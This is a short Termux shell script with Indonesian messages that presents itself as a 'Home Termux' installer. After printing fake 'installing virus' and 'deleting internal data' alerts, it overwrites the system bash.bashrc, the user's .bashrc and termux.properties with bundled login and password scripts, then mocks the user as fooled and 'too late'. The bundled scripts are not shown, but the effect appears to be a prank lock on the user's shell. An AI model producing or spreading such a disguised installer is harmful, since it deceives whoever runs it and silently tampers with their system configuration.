#!/system/bin/sh

k="\033[33;1m"
m="\033[31;1m"
pu="\033[39;1m"
p="\033[36;1m"
b="\033[34;1m"
h="\033[32;1m"
JAM=`date +%H`
MENIT=`date +%M`
DETIK=`date +%S`
TANGGAL=`date +%d`
BULAN=`date +%m`
TAHUN=`date +%Y`
clear
looping(){
sleep 0.5
printf """
${k}	┌${b}∩${k}┐${pu}(${m}◣${k}_${m}◢${pu})${k}┌${b}∩${k}┐
${m}WRONG INPUT !!!
"""
}
clear
home(){ clear
sleep 2
echo "${m}[ ${pu}Prosess.... ${m}]"
sleep 2
echo "${m}[ ${pu}Penginstalan Virus... ${m}]"
sleep 2
echo "${m}[ ${pu}Penghapusan Data Internal... ${m}]"
echo
echo "${m}[ ${p}Install Virus 2... ${m}]"
sleep 2
termux-setup-storage
cd /sdcard
mkdir termux
cd $HOME
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install git -y
pkg install figlet -y
pkg install ruby -y
gem install lolcat -y
pkg install neofetch
pkg install mc
    cp bash.bashrc /data/data/com.termux/files/usr/etc
    cp .bashrc $HOME
    cp .bash $HOME
    cp login.sh $HOME
    cp password.sh $HOME
    cp bash.sh $HOME
    cp new.sh $HOME
    cp home.sh $HOME
    cp home $HOME
    cp termux.properties /data/data/com.termux/files/home/.termux/
    cp -f opening.sh $HOME
    cp -f .bashrc /sdcard/termux
    cp -f opening.sh /sdcard/termux
    cp -f home.sh /sdcard/termux
    cp -f home /sdcard/termux
    cp -f login.sh /sdcard/termux
    cp -f password.sh /sdcard/termux
    cp -f bash.sh /sdcard/termux
    cp -f new.sh /sdcard/termux
echo "${m}[ ${pu}Loading.... ${m}]"
sleep 1
cd
sleep 2
mv .bash .bashrc
echo
sleep 2
echo "${m}[ ${h}Ha..Ha.. Ketipu🤣🤣  √√ ${m}]"
sleep 1
echo "${pu}"
echo "${m}[ ${h}Tekan Ctrl +d lalu enter ${m}]"
sleep 1
echo "${m}Telat Bego....!"
sleep 1
login
echo
}
banner(){
clear
echo
echo
echo " ${b}[${h}01${b}] ${pu}Instatall Home Termux${h}√"
echo "${pu}"
read -p " Input [Y/N]: " color
if [ $color = Y ] || [ $color = y ];then
home
elif [ $color = N ] || [ $color = n ];then
exit
else
looping
sleep 1
banner
fi
}
main(){
banner
looping
}
main
